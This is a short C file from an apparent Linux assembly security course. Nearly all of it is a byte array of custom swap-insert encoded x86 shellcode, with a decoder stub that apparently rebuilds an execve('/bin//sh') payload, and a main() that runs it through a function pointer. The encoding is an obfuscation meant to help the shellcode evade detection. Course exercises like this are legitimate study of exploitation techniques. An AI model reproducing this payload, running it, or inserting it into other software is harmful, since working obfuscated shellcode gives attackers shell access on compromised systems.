/**
 * \brief Runs swapsert encoded shellcode with decoder.
 * \details This was created as part of the SecurityTube Linux Assembly Expert
 * course at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
 * \author Travis Mathison
 * \copyright
 *
 * The MIT License (MIT)
 * 
 * Copyright (c) 2018 Travis Mathison
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x28\x5e\x31\xdb\x31\xc9\xf7\xe1\x89\xf7\xb1\x02\x80\x3c\x0e\x7f\x75\x15\x8a\x44\x0e\xfe\x8a\x5c\x0e\xff\x88\x1f\x88\x47\x01\x83\xc1\x03\x83\xc7\x02\xeb\xe5\xeb\x05\xe8\xd3\xff\xff\xff\xc0\x31\x7f\x68\x50\x7f\x2f\x2f\x7f\x68\x73\x7f\x2f\x68\x7f\x69\x62\x7f\x89\x6e\x7f\x50\xe3\x7f\xe2\x89\x7f\x89\x53\x7f\xb0\xe1\x7f\xcd\x0b\x7f\x7f\x80\x7f";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

	
